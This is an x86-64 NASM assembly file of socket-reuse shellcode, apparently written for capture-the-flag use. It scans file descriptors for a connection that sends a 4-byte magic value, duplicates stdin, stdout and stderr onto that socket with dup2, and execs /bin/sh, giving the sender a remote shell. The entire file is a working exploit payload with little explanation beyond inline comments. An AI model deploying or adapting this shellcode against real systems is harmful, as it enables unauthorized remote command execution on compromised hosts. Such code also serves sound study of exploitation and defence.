	;; Evan Jensen 64bit socket reuse shellcode
	;; Paolo Soto
	;; 03.02.2013
	;; RDI, RSI, RDX, RCX, R8, and R9 then stack		
	;; read = 0, dup2 = 33, execve = 59

	%define MAGIC dword 0xcafef00d
BITS 64
global main

	section .mytext progbits alloc exec write

main:
	xor rdi,rdi
	mov dil,20		;adjust for the popularity of the ctf
	;; dil is the starting fd to read from, we try each in decending order
	xor rdx,rdx
	mov dl,4		;read 4 bytes
		
ourread:
	dec rdi
	jnz ourread.next
	int 3			;debugging, do something else in prod
.next:
	xor rax,rax
	lea rsi,[rel main] 	;since we expect to be W&X we can resue main
	                        ;for storage 
	syscall		     	;read rax=0
	cmp al,4
	jnz ourread
	cmp [rsi], MAGIC ;this is our magic number %defined on top
	jnz ourread

	;; this dup2 code attaches stdin stdout and stderr to our socket
	;; so that we can talk to whatever program we run later
dup2: 	
	xor rsi,rsi	
	mov sil,2
.copy:
	xor rax,rax
	mov al,33		;dup2
	syscall
	dec rsi
	jns dup2.copy

	;; now just some local shellcode
	xor rax,rax
	push rax
	mov rdi, 0x68732f2f6e69622f ;/bin/sh
	push rdi
	mov al,59 		;execve in unistd_64.h
	mov rdi,rsp
	xor rsi,rsi
	xor rdx,rdx
	syscall
